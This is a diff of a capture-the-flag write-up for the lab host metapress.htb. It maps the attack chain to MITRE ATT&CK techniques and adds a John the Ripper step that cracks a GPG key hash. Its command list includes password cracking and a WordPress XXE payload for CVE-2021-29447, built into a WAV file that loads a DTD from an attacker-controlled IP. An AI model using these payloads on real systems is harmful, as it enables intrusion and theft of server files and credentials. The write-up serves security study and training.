@@ -24,11 +24,11 @@ Below, we map the attack to the MITRE ATT&CK Enterprise framework.
 | - | - | - | - | - |
 | Initial Access | Exploit Public-Facing Application | - | (1) | CVE-2022-0739/CWE-89 |
 | Execution | Command and Scripting Interpreter | Unix Shell | (1) | CVE-2022-0739/CWE-89 |
-| Credential Access | Brute Force | Password Cracking | (2) | - |
+| Credential Access | Brute Force | Password Cracking | (2), (3) | - |
 | Initial Access | Valid Accounts | Local Accounts | - | - |
-| Reconnaissance | Active Scanning | Vulnerability Scanning | (3) | - |
-| Initial Access | Exploit Public-Facing Application | - | (4) | CVE-2021-29447/CWE-611 |
-| Execution | Exploitation for Client Execution | Unix Shell | (4) | CVE-2021-29447/CWE-611 |
+| Reconnaissance | Active Scanning | Vulnerability Scanning | (4) | - |
+| Initial Access | Exploit Public-Facing Application | - | (5) | CVE-2021-29447/CWE-611 |
+| Execution | Exploitation for Client Execution | Unix Shell | (5) | CVE-2021-29447/CWE-611 |
 | Credential Access | Credentials from Password Stores | Password Managers | - | - |
 | Privilege Escalation | Valid Accounts | Local Accounts | - | - |
 
@@ -40,14 +40,19 @@ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingp
 - (2)
 ```
 john hashes --wordlist=rockyou.txt
-```
+``` 
 
 - (3)
+```
+john -w=rockyou.txt gpg.john
+```
+
+- (4)
 ```
 wpscan --url http://metapress.htb
 ```
 
-- (4)
+- (5)
 ```
 echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.17:4444/xxe_attack.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
 ```
